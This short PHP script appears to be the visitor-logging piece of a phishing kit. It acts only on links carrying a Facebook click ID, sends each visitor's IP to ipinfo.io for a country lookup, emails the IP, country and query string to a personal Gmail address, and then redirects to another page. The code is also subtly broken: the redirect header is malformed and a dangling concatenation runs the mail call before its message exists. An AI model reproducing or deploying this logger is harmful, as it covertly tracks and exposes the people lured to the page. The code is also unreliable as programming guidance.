<?php 

session_start();
$key = "123";

if (isset($_GET['fbclid'])){
  $_SESSION["u"] = $key;
}else {
  header("Location: Location: 1.php");
}
if(isset($_GET['fbclid'])){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$string =$QUERY_STRING.PHP_EOL .PHP_EOL .
'[Ipaddress]: '.$ip.PHP_EOL .PHP_EOL .
'[Country]: '.$details->country. PHP_EOL .PHP_EOL .



mail('besfortveliu11@gmail.com',"Hini | From - " . $ip, $string);
header("Location: 1.php");

}





?>